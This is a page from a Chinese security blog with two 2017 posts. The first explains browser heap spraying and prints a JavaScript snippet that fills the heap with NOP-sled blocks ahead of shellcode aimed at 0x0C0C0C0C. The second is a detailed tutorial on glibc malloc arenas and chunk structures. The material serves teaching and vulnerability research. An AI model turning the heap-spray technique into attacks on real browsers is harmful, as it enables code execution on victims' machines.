                <a class="post-title-link" href="/2017/09/10/Heap-Spray-堆与栈的协同攻击/" itemprop="url">Heap Spray: 堆与栈的协同攻击</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-10T11:27:08+08:00">
                2017-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞</p>
<ol>
<li>当浏览器或其使用ActiveX空间中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞。</li>
<li>不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP</li>
<li>有时我们可能很难在浏览器中复杂的内存环境中布置完整的shellcode</li>
<li>页面中的Javascript可以申请堆内存，因此把shellcode通过Javascript布置在堆中成为可能</li>
</ol>
<p>在使用Heap Spray，一般会将EIP指向堆区的0x0C0C0C0C位置，然后用JavaScript申请大量堆内存，并用包含着0x90的“内存片”覆盖这些内存</p>
<p>通常JavaScript从内存地址向内存高址分配内存，因此申请的内存超过200MB（200MB=200 X 1024 X 1024=0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C将被含有shellcode的内存片覆盖。只要内存片中的0x90能够命中0x0C0C0C0C位置，shellcode就能执行。</p>
<p>可以用下面的方式覆盖内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var nop=unescape(&quot;%u9090%u9090&quot;);</div><div class="line">while (nop.length &lt;= 0x100000/2)</div><div class="line">&#123;</div><div class="line">    nop += nop;</div><div class="line">&#125;//生成一个1MB充满0x90的数据块</div><div class="line"></div><div class="line">nop = nop.substring(0, 0x100000/2 -32/2 -4/2 -shellcode.length -2/2);</div><div class="line">var slide = new Arrat();</div><div class="line">for (var i=0; i &lt; 200; i++)</div><div class="line">&#123;</div><div class="line">    slide[i] = nop + shellcode;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>每个内存片1MB</li>
<li>首先产生一个1MB且全为0x90的内存块</li>
<li>JavaScript会添加一些额外信息，得减去。堆块信息 32字节； 字符串长度 4字节； 结束符 2个字节的NULL</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/10/Linux堆内存管理深入分析（上）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/10/Linux堆内存管理深入分析（上）/" itemprop="url">Linux堆内存管理深入分析（上）</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-10T11:02:06+08:00">
                2017-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近年来，漏洞挖掘越来越火，各种漏洞挖掘、利用的分析文章层出不穷。从大方向来看，主要有基于栈溢出的漏洞利用和基于堆溢出的漏洞利用两种。国内关于栈溢出的资料相对较多，这里就不累述了，但是关于堆溢出的漏洞利用资料就很少了。鄙人以为主要是堆溢出漏洞的门槛较高，需要先吃透相应操作系统的堆内存管理机制，而这部分内容一直是一个难点。因此本系列文章主要从Linux系统堆内存管理机制出发，逐步介绍诸如基本堆溢出漏洞、基于unlink的堆溢出漏洞利用、double free、use-after-free等等常见的堆溢出漏洞利用技术。</p>
<p>前段时间偶然学习了这篇文章：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>
<p>该文是我近段时间以来读到的最好文章之一，文章浅显易懂，条例清晰，作为初学者的我从中学到了很多linux堆内存管理相关的知识。但是估计由于篇幅的限制，该文对很多难点一带而过，造成部分知识点理解上的困难。因此我决定以该文为蓝本，结合其他参考资料和自己的理解，写一篇足够详细、完整的linux堆管理介绍文章，希冀能够给其他初学者献上微末之力。所以就内容来源而言，本文主要由两部分组成：一部分是翻译的上面提及的文章；另一部分是笔者结合其他参考资料和自己的理解添加的补充说明。鉴于笔者知识能力上的不足，如有问题欢迎各位大牛斧正！</p>
<p>同样的，鉴于篇幅过长，我将文章分成了上下两部分，上部分主要介绍堆内存管理中的一些基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。后半部分主要介绍glibc malloc为了提高堆内存分配和释放的效率，引入的显示链表技术，即binlist的概念和核心原理。其中使用到的源码在：</p>
<p><a href="https://github.com/sploitfun/lsploits/tree/master/glibc" target="_blank" rel="external">https://github.com/sploitfun/lsploits/tree/master/glibc</a></p>
<p><a href="/others/files/malloc.c">malloc.c源码</a>。</p>
<h3 id="1、堆的介绍"><a href="#1、堆的介绍" class="headerlink" title="1、堆的介绍"></a>1、堆的介绍</h3><p>（1）堆在内存空间中不一定连续</p>
<p>（2）堆可由用户管理</p>
<p>常见的分配堆的方式：</p>
<ul>
<li>dlmalloc : general purpose allocator</li>
<li><font color="#f00">ptmalloc2 : glibc</font></li>
<li>jemalloc : FreeBSD 、Firefox and Android</li>
<li>tcmalloc : Google Chrome</li>
<li>libumem : Solaris</li>
</ul>
<p>本文主要学习介绍在linux glibc使用的ptmalloc2实现原理。</p>
<p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p>
<p>当然在linux平台*malloc本质上都是通过系统调用brk或者mmap实现的。关于这部分内容，<strong>一定要学习下面</strong>这篇文章：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p>
<p> 鉴于篇幅，本文就不加以详细说明了，只是为了方便后面对堆内存管理的理解，截取其中函数调用关系图：</p>
<p><img src="/images/2017-09-10/41u4qg499890.png" alt="函数调用关系图"></p>
<p>系统内存分布图：</p>
<p><img src="/images/2017-09-10/41u4qk4f6q40.png" alt="系统内存分布图"></p>
<h3 id="2、实验演示"><a href="#2、实验演示" class="headerlink" title="2、实验演示"></a>2、实验演示</h3><p>试想有如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Per thread arena example. */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">pthread_t</span> t1;</div><div class="line">        <span class="keyword">void</span>* s;</div><div class="line">        <span class="keyword">int</span> ret;</div><div class="line">        <span class="keyword">char</span>* addr;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        ret = pthread_join(t1, &amp;s);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面我们依次分析其各个阶段的堆内存分布状况。</p>
<ol>
<li><h4 id="Before-malloc-in-main-thread"><a href="#Before-malloc-in-main-thread" class="headerlink" title="Before malloc in main thread"></a>Before malloc in main thread</h4></li>
</ol>
<p>在程序调用malloc之前程序进程中是没有heap segment的，并且在创建在创建线程前，也是没有线程堆栈的。</p>
<ol start="2">
<li><h4 id="After-malloc-in-main-thread"><a href="#After-malloc-in-main-thread" class="headerlink" title="After malloc in main thread"></a>After malloc in main thread</h4></li>
</ol>
<p>在主线程中调用malloc之后，就会发现系统给程序分配了堆栈，且这个堆栈刚好在数据段之上：</p>
<p><img src="/images/2017-09-10/v2-5721084ff178629469e27bc4f386bb09_b.png" alt=""></p>
<p>这就说明它是通过brk系统调用实现的。并且，还可以看出虽然我们只申请了1000字节的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以叫做main arena(每个arena中含有多个chunk，这些chunk以链表的形式加以组织)。由于132KB比1000字节大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。</p>
<ol start="3">
<li><h4 id="After-free-in-main-thread"><a href="#After-free-in-main-thread" class="headerlink" title="After free in main thread"></a>After free in main thread</h4></li>
</ol>
<p>在主线程调用free之后：从内存布局可以看出程序的堆空间并没有被释放掉，原来调用free函数释放已经分配了的空间并非直接“返还”给系统，而是由glibc 的malloc库函数加以管理。它会将释放的chunk添加到main arenas的bin(这是一种用于存储同类型free chunk的双链表数据结构，后问会加以详细介绍)中。在这里，记录空闲空间的freelist数据结构称之为bins。之后当用户再次调用malloc申请堆空间的时候，glibc malloc会先尝试从bins中找到一个满足要求的chunk，如果没有才会向操作系统申请新的堆空间。如下图所示：</p>
<p><img src="/images/2017-09-10/v2-bf8b91202e341b07c0b7500dff5c0bb7_b.png" alt=""></p>
<ol start="4">
<li><h4 id="Before-malloc-in-thread1"><a href="#Before-malloc-in-thread1" class="headerlink" title="Before malloc in thread1"></a>Before malloc in thread1</h4></li>
</ol>
<p>在thread1调用malloc之前：从输出结果可以看出thread1中并没有heap segment，但是此时thread1自己的栈空间已经分配完毕了：</p>
<p><img src="/images/2017-09-10/v2-b16ccca0d60949c38b4873463bed752c_b.png" alt=""></p>
<ol start="5">
<li><h4 id="After-malloc-in-thread1"><a href="#After-malloc-in-thread1" class="headerlink" title="After malloc in thread1"></a>After malloc in thread1</h4></li>
</ol>
<p>在thread1调用malloc之后：从输出结果可以看出thread1的heap segment已经分配完毕了，同时从这个区域的起始地址可以看出，它并不是通过brk分配的，而是通过mmap分配，因为它的区域为b7500000-b7600000共1MB，并不是同程序的data segment相邻。同时，我们还能看出在这1MB中，根据内存属性分为了2部分：0xb7500000-0xb7521000共132KB大小的空间是可读可写属性；后面的是不可读写属性。原来，这里只有可读写的132KB空间才是thread1的堆空间，即thread1 arena。</p>
<p><img src="/images/2017-09-10/v2-4fdb53e52451ec6fa9f589427f6808b4_b.png" alt=""></p>
<ol start="6">
<li><h4 id="在thread1调用free之后：同main-thread。"><a href="#在thread1调用free之后：同main-thread。" class="headerlink" title="在thread1调用free之后：同main thread。"></a>在thread1调用free之后：同main thread。</h4></li>
</ol>
<h3 id="3、Arena介绍"><a href="#3、Arena介绍" class="headerlink" title="3、Arena介绍"></a>3、Arena介绍</h3><h4 id="3-1-Arena数量限制"><a href="#3-1-Arena数量限制" class="headerlink" title="3.1 Arena数量限制"></a>3.1 Arena数量限制</h4><p>在第2章中我们提到main thread和thread1有自己独立的arena，那么是不是无论有多少个线程，每个线程都有自己独立的arena呢？答案是否定的。事实上，arena的个数是跟系统中处理器核心个数相关的，如下表所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For 32 bit systems:</div><div class="line">     Number of arena = 2 * number of cores + 1.</div><div class="line">For 64 bit systems:</div><div class="line">     Number of arena = 8 * number of cores + 1.</div></pre></td></tr></table></figure>
<h4 id="3-2-多Arena的管理"><a href="#3-2-多Arena的管理" class="headerlink" title="3.2 多Arena的管理"></a>3.2 多Arena的管理</h4><p>假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2*核心数 + 1= 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？</p>
<p>当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。</p>
<p>当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？</p>
<p>1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。</p>
<p>2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。</p>
<p>3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。</p>
<p>这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。</p>
<h3 id="4、堆管理介绍"><a href="#4、堆管理介绍" class="headerlink" title="4、堆管理介绍"></a>4、堆管理介绍</h3><h4 id="4-1-整体介绍"><a href="#4-1-整体介绍" class="headerlink" title="4.1 整体介绍"></a>4.1 整体介绍</h4><p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ol>
<li>heap_info: 即Heap Header，因为一个<strong>thread arena</strong>（注意：不包含<strong>main thread</strong>）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。那么在什么情况下一个thread arena会包含多个heaps呢?在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></div><div class="line">&#123;</div><div class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></div><div class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></div><div class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></div><div class="line">                           PROT_READ|PROT_WRITE.  */</div><div class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></div><div class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</div><div class="line">     MALLOC_ALIGNMENT. */</div><div class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</div><div class="line">&#125; heap_info;</div></pre></td></tr></table></figure>
<ol start="2">
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等(这些概念会在后文详细介绍):</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">&#123;</div><div class="line">  <span class="comment">/* Serialize access.  */</span></div><div class="line">  <span class="keyword">mutex_t</span> mutex;</div><div class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line">  <span class="keyword">int</span> flags;</div><div class="line">  <span class="comment">/* Fastbins */</span></div><div class="line">  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line">  mchunkptr top;</div><div class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line">  mchunkptr last_remainder;</div><div class="line">  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line">  <span class="comment">/* Bitmap of bins */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line">  <span class="comment">/* Linked list */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line">  <span class="comment">/* Linked list for free arenas.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line">  INTERNAL_SIZE_T system_mem;</div><div class="line">  INTERNAL_SIZE_T max_system_mem;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ol start="3">
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小(这里给“就是”加上引号，说明这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文)。每个chunk都由一个结构体malloc_chunk表示：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>可能有很多读者会疑惑：该结构体里面并没有一个类似于data的字段来表示用户申请到的堆内存空间啊？且该结构体明确含有2个size_t类型的成员，4个指针，这不就意味着malloc_chunk的大小是固定的了么？那它又如何能够根据用户的请求分配不同大小的内存呢？要想回答清楚这个问题，需要我们完全理解整个glibc malloc的堆内存管理机制，同时，本文的主要目的之一就是希冀解释清楚这个概念，鉴于这部分内容较多，我将在后文的第5章加以详细介绍。</p>
<p><strong>NOTE:</strong></p>
<p>1.Main thread不含有多个heaps所以也就不含有heap_info结构体。当需要更多堆空间的时候，就通过扩展sbrk的heap segment来获取更多的空间，直到它碰到内存mapping区域为止。</p>
<p>2.不同于thread arena，main arena的arena header并不是sbrk heap segment的一部分，而是一个全局变量！因此它属于libc.so的data segment。</p>
<h4 id="4-2-heap-segment与arena关系"><a href="#4-2-heap-segment与arena关系" class="headerlink" title="4.2 heap segment与arena关系"></a>4.2 heap segment与arena关系</h4><p>首先，通过内存分布图理清malloc_state与heap_info之间的组织关系。</p>
<p>下图是只有一个heap segment的main arena和thread arena的内存分布图：</p>
<p><img src="/images/2017-09-10/v2-cdc4b19aeb0c5bd01d24589c303f5d3b_b.png" alt=""></p>
<p>图4-1 只含一个heap segment的main arena与thread arena图</p>
<p>下图是一个thread arena中含有多个heap segments的情况：</p>
<p><img src="/images/2017-09-10/v2-d1ef4f85211061232d4397f4929e8e91_b.png" alt=""></p>
<p>图4-2 一个thread arena含有多个heap segments的内存分布图</p>
<p>从上图可以看出，thread arena只含有一个malloc_state(即arena header)，却有两个heap_info(即heap header)。由于两个heap segments是通过mmap分配的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，libc malloc将第二个heap_info结构体的prev成员指向了第一个heap_info结构体的起始位置（即ar_ptr成员），而第一个heap_info结构体的ar_ptr成员指向了malloc_state，这样就构成了一个单链表，方便后续管理。</p>
<h3 id="5、对chunk的理解"><a href="#5、对chunk的理解" class="headerlink" title="5、对chunk的理解"></a>5、对chunk的理解</h3><p>在glibc malloc中将整个堆内存空间分成了连续的、大小不一的chunk，即对于堆内存管理而言chunk就是最小操作单位。Chunk总共分为4类：</p>
<p>1)allocated chunk;</p>
<p> 2)free chunk; </p>
<p>3)top chunk;</p>
<p> 4)Last remainder chunk。</p>
<p>从本质上来说，所有类型的chunk都是内存中一块连续的区域，只是通过该区域中<strong>特定位置的某些标识符</strong>加以区分。为了简便，我们先将这4类chunk简化为2类：allocated chunk以及free chunk，前者表示已经分配给用户使用的chunk，后者表示未使用的chunk。</p>
<p>众所周知，无论是何种堆内存管理器，其完成的核心目的都是能够高效地分配和回收内存块(chunk)。因此，它需要设计好相关算法以及相应的数据结构，而数据结构往往是根据算法的需要加以改变的。既然是算法，那么算法肯定有一个优化改进的过程，所以本文将根据堆内存管理器的演变历程，逐步介绍在glibc malloc中chunk这种数据结构是如何设计出来的，以及这样设计的优缺点。</p>
<p>PS:鉴于时间和精力有限，后文介绍的演变历程并没有加以严格考证，笔者只是按照一些参考书籍、自己的理解以及便于文章内容安排做出的“善意的捏造”，如有错误，欢迎大家斧正！</p>
<h4 id="5-1-隐式链表技术"><a href="#5-1-隐式链表技术" class="headerlink" title="5.1 隐式链表技术"></a>5.1 隐式链表技术</h4><p>前文说过，任何堆内存管理器都是以chunk为单位进行堆内存管理的，而这就需要一些数据结构来标志各个块的边界，以及区分已分配块和空闲块。大多数堆内存管理器都将这些边界信息作为chunk的一部分嵌入到chunk内部，典型的设计如下所示：</p>
<p><img src="/images/2017-09-10/v2-7e0628272e1bf28e38bc99849774c0c9_b.png" alt=""></p>
<p>图5-1 简单的allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-f092bde1862553448676a9adc97d6de3_b.png" alt=""></p>
<p>图5-2 简单的free chunk格式</p>
<p><font color="#f00">堆内存中要求每个chunk的大小必须为8的整数倍，因此chunk size的后3位是无效的，为了充分利用内存，堆管理器将这3个比特位用作chunk的标志位，典型的就是将第0比特位用于标记该chunk是否已经被分配。</font>这样的设计很巧妙，因为我们只要获取了一个指向chunk size的指针，就能知道该chunk的大小，即确定了此chunk的边界，且利用chunk size的第0比特位还能知道该chunk是否已经分配，这样就成功地将各个chunk区分开来。注意在allocated chunk中padding部分主要是用于地址对齐的(也可用于对付外部碎片)，即让整个chunk的大小为8的整数倍。</p>
<p>通过上面的设计，我们就能将整个堆内存组织成一个连续的已分配或未分配chunk序列:</p>
<p><img src="/images/2017-09-10/v2-df2d5bd535e5a00382d4647c0a900109_b.png" alt=""></p>
<p>图5-3 简单的chunk序列</p>
<p>上面的这种结构就叫做隐式链表。该链表隐式地由每个chunk的size字段链接起来，在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的chunk，分析每个chunk的size字段，进而找到合适的chunk。</p>
<p>细心的读者可能发现：这种隐式链表效率其实是相当低的，特别是在内存回收方面，它难以进行相邻多个free chunk的合并操作。我们知道，如果只对free chunk进行分割，而不进行合并的话，就会产生大量小的、无法继续使用的内部碎片，直至整个内存消耗殆尽。因此堆内存管理器设计了带边界标记的chunk合并技术。</p>
<h5 id="1-带边界标记的合并技术"><a href="#1-带边界标记的合并技术" class="headerlink" title="1.带边界标记的合并技术"></a>1.带边界标记的合并技术</h5><p>试想如下场景：假设我们要释放的chunk为P，它紧邻的前一个chunk为FD，紧邻的后一个chunk为BK，且BK与FD都为free chunk。将P于BK合并在一起是很容易的，因为可以通过P的size字段轻松定位到BK的开始位置，进而获取BK的size等等，但是将P于FD合并却很难，我们必须从头遍历整个堆，找到FD，然后加以合并，这就意味着每次进行chunk释放操作消耗的时间与堆的大小成线性关系。为了解决这个问题，Knuth提出了一种聪明而通用的技术——边界标记。</p>
<p>Knuth在每个chunk的最后添加了一个脚部(Footer)，它就是该chunk 头部(header)的一个副本，我们称之为边界标记：</p>
